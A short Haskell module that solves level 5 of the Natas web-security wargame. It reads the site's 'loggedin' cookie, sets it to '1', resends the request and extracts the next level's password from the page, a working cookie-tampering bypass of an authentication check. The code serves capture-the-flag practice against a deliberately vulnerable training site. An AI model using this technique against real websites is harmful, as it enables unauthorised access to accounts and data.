{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas5 where

import           Control.Lens
import           Network.HTTP.Client.Internal (createCookieJar)
import           Network.Wreq                 (cookieValue, cookies,
                                               responseCookie)
import           Safe                         (lastMay)

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  req <- accessLevel 5
  let ckis = req ^.. responseCookie "loggedin"
      ckiopt = cookies .~ pure (createCookieJar (ckis <&> cookieValue .~ "1"))
  ckireq <- accessLevel' 5 (parentUri 5) ckiopt
  let body = reqBody ckireq
      match = workupBody 6 body
  pure $ match >>= lastMay
